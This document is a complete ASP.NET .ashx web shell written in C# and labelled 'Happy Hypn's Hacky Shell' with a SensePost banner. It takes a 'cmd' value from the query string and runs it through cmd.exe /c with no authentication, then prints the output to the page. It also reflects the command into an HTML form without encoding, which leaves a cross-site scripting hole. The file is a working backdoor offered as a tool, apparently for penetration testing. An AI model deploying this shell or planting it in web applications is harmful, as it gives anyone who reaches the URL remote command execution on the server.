<% @ webhandler language="C#" class="AverageHandler" %> 

using System; 
using System.Web; 
using System.Diagnostics; 
using System.IO; 

public class AverageHandler : IHttpHandler 
{ 
	public bool IsReusable 
	{
		get { return true; }
	}

	public void ProcessRequest(HttpContext ctx) 
	{
		Uri theRealURL = new Uri(HttpContext.Current.Request.Url.Scheme + "://" +   HttpContext.Current.Request.Url.Authority + HttpContext.Current.Request.RawUrl);
		string teh_cmd = HttpUtility.ParseQueryString(theRealURL.Query).Get("cmd");

		ctx.Response.Write("<strong>Happy Hypn's Hacky Shell</strong><br />");
		ctx.Response.Write("<marquee style='color: #FF00FF'><3 SensePost&nbsp;&nbsp;&nbsp;&nbsp;<3 SensePost&nbsp;&nbsp;&nbsp;&nbsp;<3 SensePost&nbsp;&nbsp;&nbsp;&nbsp;<3 SensePost&nbsp;&nbsp;&nbsp;&nbsp;<3 SensePost&nbsp;&nbsp;&nbsp;&nbsp;<3 SensePost&nbsp;&nbsp;&nbsp;&nbsp;<3 SensePost&nbsp;&nbsp;&nbsp;&nbsp;<3 SensePost&nbsp;&nbsp;&nbsp;&nbsp;<3 SensePost&nbsp;&nbsp;&nbsp;&nbsp;<3 SensePost&nbsp;&nbsp;&nbsp;&nbsp;</marquee><br />");
		ctx.Response.Write("<form method='GET'><input name='cmd' value='"+teh_cmd+"'><input type='submit'></from>");
		ctx.Response.Write("<hr>");
		
		ctx.Response.Write("<pre>");
		ProcessStartInfo psi = new ProcessStartInfo();
		psi.FileName = "cmd.exe";
		psi.Arguments = "/c "+teh_cmd;
		psi.RedirectStandardOutput = true;
		psi.UseShellExecute = false;
		Process p = Process.Start(psi);
		StreamReader stmrdr = p.StandardOutput;
		string s = stmrdr.ReadToEnd();
		stmrdr.Close();

		ctx.Response.Write(s);
	} 

}